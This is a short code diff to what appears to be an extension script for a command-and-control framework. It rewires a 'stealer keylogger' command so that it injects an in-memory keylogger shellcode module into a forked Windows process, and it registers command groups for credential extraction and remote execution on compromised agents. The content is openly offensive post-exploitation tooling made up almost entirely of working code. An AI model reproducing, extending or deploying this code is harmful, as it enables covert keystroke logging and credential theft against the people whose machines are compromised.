@@ -207,7 +207,7 @@ cmd_stealer_keylogger.setPreHook(function (id, cmdline, parsed_json, ...parsed_l
     let mod_path = ax.script_dir() + "Shellcode/Keylogger/Bin/keylogger_assembly." + ax.arch(id) + ".bin";
     let message = `Task: executing Keylogger in-memory`;
 
-    ax.execute_alias(id, cmdline, `execute keylogger -m fork -t ${fork_method} -p ${fork_pid}`, message);
+    ax.execute_alias(id, cmdline, `execute postex -m fork -t ${fork_method} -p ${fork_pid} -f ${mod_path} -a ${mod_params}`, message);
 });
 
 let cmd_stealer = ax.create_command("stealer", "Information gathering and credential extraction operations");
@@ -220,4 +220,3 @@ var group_rmt_exec = ax.create_commands_group("Remote Execution", [cmd_rmt_exec]
 ax.register_commands_group(group_stealer , ["kharon"], ["windows"], []);
 ax.register_commands_group(group_dotnet  , ["kharon"], ["windows"], []);
 ax.register_commands_group(group_rmt_exec, ["kharon"], ["windows"], []);
-
